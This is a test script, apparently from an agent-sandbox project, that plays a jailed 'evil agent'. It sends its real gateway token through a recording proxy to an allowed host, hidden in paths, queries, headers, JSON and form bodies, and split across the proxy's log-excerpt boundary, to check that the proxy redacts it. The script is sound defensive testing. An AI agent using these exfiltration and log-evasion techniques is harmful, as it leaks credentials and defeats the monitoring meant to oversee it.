"""Evil agent: smuggle secrets into what the proxy records about its requests.

Runs INSIDE the jail, as the agent's user (python3 -c). Usage:
<script> <allowed host> <tag> <excerpt bytes>
Prints one JSON object on its last line.

The secret is the one it really has: the Gateway token, in its environment (OpenClaw's exec
hands it on too). It sends it to an allowed host (the test's fake internet) in the path, in the
query, in an odd header, in lower case, in a JSON body and in a form body, and cut in two by the
end of the body excerpt the proxy keeps (the first half inside it, the rest outside; and the
other way round). The proxy does not know the token: backtide must strike it, and its pieces,
before recording. A made-up key with a provider's shape goes along in a header and a body.
"""

import http.client
import json
import os
import ssl
import sys
from urllib.parse import quote

host, tag, excerpt = sys.argv[1], sys.argv[2], int(sys.argv[3])
token = os.environ["OPENCLAW_GATEWAY_TOKEN"]
made_up = "sk-ant-api03-" + "Mx7" * 30  # the shape of a key, nobody's
PROXY = ("backtide-proxy", 8080)
CA = "/etc/backtide-ca/ca.pem"


def send(path, method="GET", headers=None, body=None):
    conn = http.client.HTTPSConnection(
        *PROXY, timeout=30, context=ssl.create_default_context(cafile=CA)
    )
    conn.set_tunnel(host, 443)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        response = conn.getresponse()
        response.read()
        return response.status
    except (OSError, http.client.HTTPException) as error:
        return f"{type(error).__name__}: {error}"[:200]
    finally:
        conn.close()


half = len(token) // 2
text = {"content-type": "text/plain"}
sent = {
    "path": send(f"/{tag}/path/{token}/end"),
    "query": send(f"/{tag}/query?session={quote(token)}&q=1"),
    "header": send(f"/{tag}/header", headers={"X-Session-Note": token, "X-Key": made_up}),
    "lowercase": send(f"/{tag}/lower", headers={"X-Session-Note": token.lower()}),
    "json": send(
        f"/{tag}/json",
        "POST",
        {"content-type": "application/json"},
        json.dumps({"note": token, "key": made_up}).encode(),
    ),  # fmt: skip
    "form": send(
        f"/{tag}/form",
        "POST",
        {"content-type": "application/x-www-form-urlencoded"},
        f"a=1&note={quote(token)}&b=2".encode(),
    ),  # fmt: skip
    # The excerpt keeps the first ``excerpt`` bytes: the token straddles that edge.
    "cut_first_half_in": send(
        f"/{tag}/cut-a", "POST", text, ("x" * (excerpt - half) + token + "y" * 64).encode()
    ),
    "cut_last_chars_in": send(
        f"/{tag}/cut-b", "POST", text, ("x" * (excerpt - len(token) + 6) + token).encode()
    ),
    "cut_first_chars_in": send(
        f"/{tag}/cut-c", "POST", text, ("x" * (excerpt - 6) + token).encode()
    ),
}
print(json.dumps({"sent": sent, "token_length": len(token)}))
